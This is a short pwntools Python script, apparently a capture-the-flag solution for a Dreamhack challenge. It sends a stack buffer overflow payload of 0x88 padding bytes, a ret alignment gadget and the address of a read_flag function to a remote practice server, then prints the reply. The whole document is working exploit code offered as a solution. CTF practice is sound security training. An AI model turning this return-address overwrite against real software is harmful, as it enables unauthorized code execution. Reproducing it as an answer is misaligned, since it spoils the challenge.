from pwn import *

p = remote("host3.dreamhack.games", 20577)

ret = 0x40101a        # ret 가젯
read_flag = 0x40127c

payload  = b"A" * 0x80
payload += b"B" * 8
payload += p64(ret)
payload += p64(read_flag)

p.sendline(payload)

print(p.recvall(timeout=1).decode(errors="ignore"))
